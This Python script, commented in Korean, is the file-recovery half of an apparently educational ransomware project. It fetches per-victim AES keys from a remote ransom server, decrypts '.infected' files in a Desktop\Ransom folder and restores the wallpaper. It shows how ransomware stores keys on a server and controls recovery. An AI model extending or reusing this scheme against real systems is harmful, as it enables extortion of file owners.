import glob
import os
import base64
import struct
import requests
import ctypes
import time
from Crypto.Cipher import AES


def decrypt_file(key, in_filename, chunk_size=1024 * 64):           # 파일 복호화 함수, chunk 크기가 클수록 처리 속도 증가
    out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        orig_size = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)                                        # initialize vector 불러오기
        dec = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                outfile.write(dec.decrypt(chunk))

            outfile.truncate(orig_size)


def main():
    start_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\Ransom'  # 바탕화면 Ransom 폴더 경로 지정
    uid_path = start_path + '\\uid.dat'                                     # unique id 경로 지정
    uid = open(uid_path, 'r').read()

    db = requests.get('https://ransom.ktwserver.xyz/db/db.txt').text        # 서버에서 database 불러오기
    key_start = db.find(uid + '/') + len(uid + '/')
    key_end = key_start + db[key_start:].find('@')
    key = db[key_start:key_end]                                             # 'uid/key@' 형태의 문자열에서 key 값만 슬라이싱
    key = base64.urlsafe_b64decode(key)                                     # php 인자로 전달하기 때문에 urlsafe 필요

    for filename in glob.iglob(start_path + '\**', recursive=True):         # 지정된 경로의 모든 하위 폴더 및 파일 암호화
        if os.path.isfile(filename):
            f_name, ext = os.path.splitext(filename)                        # 파일명과 확장자 분리
            if ext == '.infected':
                print('감염된 파일 치료 중... --> ' + filename)
                decrypt_file(key, filename)
                os.remove(filename)
    os.remove(uid_path)

    if os.path.isfile('C:\original_background.png'):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\original_background.png', 0)  # 바탕화면 이미지 복구
        time.sleep(1.5)
        os.remove('C:\original_background.png')

    print('모든 파일을 치료했습니다!')
    os.system('pause')


if __name__ == '__main__':
    main()
